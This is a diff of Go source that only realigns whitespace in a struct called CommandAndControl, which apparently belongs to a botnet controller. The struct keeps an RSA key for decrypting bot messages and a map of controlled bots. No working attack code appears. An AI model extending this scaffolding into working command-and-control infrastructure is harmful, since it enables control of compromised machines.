@@ -10,10 +10,10 @@ import (
 
 // CommandAndControl is the command and control - controller
 type CommandAndControl struct {
-	ServerKey string
-	msgDecryptKey  *rsa.PrivateKey
-	recvMsgChan chan *protocol.Message // Channel for receiving de-crypted messages requests
-	bots           map[string]*BotCtrl
+	ServerKey     string
+	msgDecryptKey *rsa.PrivateKey
+	recvMsgChan   chan *protocol.Message // Channel for receiving de-crypted messages requests
+	bots          map[string]*BotCtrl
 }
 
 // NewCmdAndCtrl is the constructor for a CommandAndControl
@@ -24,10 +24,10 @@ func NewCmdAndCtrl() (*CommandAndControl, error) {
 	}
 	log.Printf("[master] public key: \n%s", string(pub))
 	return &CommandAndControl{
-		msgDecryptKey:  priv,
-		ServerKey:   string(pub),
-		recvMsgChan: make(chan *protocol.Message),
-		bots:           make(map[string]*BotCtrl),
+		msgDecryptKey: priv,
+		ServerKey:     string(pub),
+		recvMsgChan:   make(chan *protocol.Message),
+		bots:          make(map[string]*BotCtrl),
 	}, nil
 }
 
@@ -36,7 +36,7 @@ func (cc *CommandAndControl) Start() {
 	for {
 		select {
 		// handle the next message
-	case event := <-cc.recvMsgChan:
+		case event := <-cc.recvMsgChan:
 			cc.handleMessage(event)
 		}
 	}
